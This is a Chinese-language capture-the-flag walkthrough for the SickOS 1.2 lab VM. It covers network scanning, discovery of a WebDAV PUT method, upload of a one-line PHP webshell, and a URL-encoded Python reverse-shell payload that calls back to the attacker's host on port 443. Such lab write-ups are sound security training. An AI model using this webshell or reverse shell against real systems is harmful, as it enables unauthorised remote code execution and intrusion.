# SickOS 1.2

首先我们使用arp-scan -l 发现目标主机。

<pre><code>┌──(root㉿kali)-[~]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:f5:d6:36, IPv4: 192.168.5.134
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.5.1     00:50:56:c0:00:08       VMware, Inc.
192.168.5.2     00:50:56:f6:37:b9       VMware, Inc.
192.168.5.131   00:0c:29:1f:27:fc       VMware, Inc.
<a data-footnote-ref href="#user-content-fn-1">192.168.5.136</a>   00:0c:29:d6:78:03       VMware, Inc.
192.168.5.254   00:50:56:e6:f6:66       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.946 seconds (131.55 hosts/sec). 5 responded                                                                                       
</code></pre>

然后nmap查看一下目标的开放端口

```
┌──(root㉿kali)-[~]
└─# nmap  -sV -sS 192.168.5.136
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-11 20:16 EST
Nmap scan report for 192.168.5.136
Host is up (0.00042s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    lighttpd 1.4.28
MAC Address: 00:0C:29:D6:78:03 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.33 seconds
```

80端口似乎是个web页面，访问一下

<figure><img src="../../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

没有什么有用的信息，最后一行显示这里什么都没有。我们尝试找下是否存在隐藏目录

```
┌──(root㉿kali)-[~]
└─# gobuster dir -u http://192.168.5.136/ -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.136/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/test                 (Status: 301) [Size: 0] [--> http://192.168.5.136/test/]
/~sys~                (Status: 403) [Size: 345]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

这里得到了一个/test的目录

<figure><img src="../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

我们使用nikto扫描一下，发现这个地址支持OPTIONS, GET, HEAD, POST的请求方法

```
┌──(root㉿kali)-[~]
└─# nikto -host http://192.168.5.136/  
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.5.136
+ Target Hostname:    192.168.5.136
+ Target Port:        80
+ Start Time:         2023-12-11 20:55:13 (GMT-5)
---------------------------------------------------------------------------
+ Server: lighttpd/1.4.28
+ /: Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .
```

我们尝试使用curl看看/test/这个目录支持的方法

<pre><code>┌──(root㉿kali)-[~]
└─# curl -v -X OPTIONS http://192.168.5.136/test/ 
*   Trying 192.168.5.136:80...
* Connected to 192.168.5.136 (192.168.5.136) port 80
> OPTIONS /test/ HTTP/1.1
> Host: 192.168.5.136
> User-Agent: curl/8.4.0
> Accept: */*
> 
&#x3C; HTTP/1.1 200 OK
&#x3C; DAV: 1,2
&#x3C; MS-Author-Via: DAV
&#x3C; Allow: PROPFIND, DELETE, MKCOL,<a data-footnote-ref href="#user-content-fn-2"> PUT</a>, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
&#x3C; Allow: OPTIONS, GET, HEAD, POST
&#x3C; Content-Length: 0
&#x3C; Date: Tue, 12 Dec 2023 02:05:41 GMT
&#x3C; Server: lighttpd/1.4.28
&#x3C; 
* Connection #0 to host 192.168.5.136 left intact 
</code></pre>

可以看到支持PUT方法，OK那我们可以先在本地创建一个webshell文件

```
┌──(root㉿kali)-[~/Desktop/test]
└─#  echo '<?php passthru($_GET["cmd"]) ?>' > shell.php
```

将创建好的文件使用PUT方法上传到/test/目录

```
┌──(root㉿kali)-[~/Desktop/test]
└─# curl -v -X PUT http://192.168.5.136/test/ -T shell.php
Note: Unnecessary use of -X or --request, PUT is already inferred.
*   Trying 192.168.5.136:80...
* Connected to 192.168.5.136 (192.168.5.136) port 80
> PUT /test/shell.php HTTP/1.1
> Host: 192.168.5.136
> User-Agent: curl/8.4.0
> Accept: */*
> Content-Length: 32
> 
* We are completely uploaded and fine
< HTTP/1.1 201 Created
< Content-Length: 0
< Date: Tue, 12 Dec 2023 02:17:33 GMT
< Server: lighttpd/1.4.28
< 
* Connection #0 to host 192.168.5.136 left intact
```

我们访问一下/test/这个目录，可以看到文件上传成功

<figure><img src="../../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

curl执行一下命令

```
┌──(root㉿kali)-[~/Desktop/test]
└─# curl -v "http://192.168.5.136/test/shell.php?cmd=id;whoami;ls+-l" 
*   Trying 192.168.5.136:80...
* Connected to 192.168.5.136 (192.168.5.136) port 80
> GET /test/shell.php?cmd=id;whoami;ls+-l HTTP/1.1
> Host: 192.168.5.136
> User-Agent: curl/8.4.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< X-Powered-By: PHP/5.3.10-1ubuntu3.21
< Content-type: text/html
< Transfer-Encoding: chunked
< Date: Tue, 12 Dec 2023 02:21:21 GMT
< Server: lighttpd/1.4.28
< 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
total 4
-rw-r--r-- 1 www-data www-data 32 Dec 11 18:17 shell.php
* Connection #0 to host 192.168.5.136 left intact
```

在反弹shell的时候它似乎有端口限制，443端口可以反弹shell，我们这里用python的payload

```
http://192.168.5.136/test/shell.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.5.134%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22bash%22%29%27
```

{% embed url="https://www.revshells.com/" %}

[^1]: 

[^2]: 
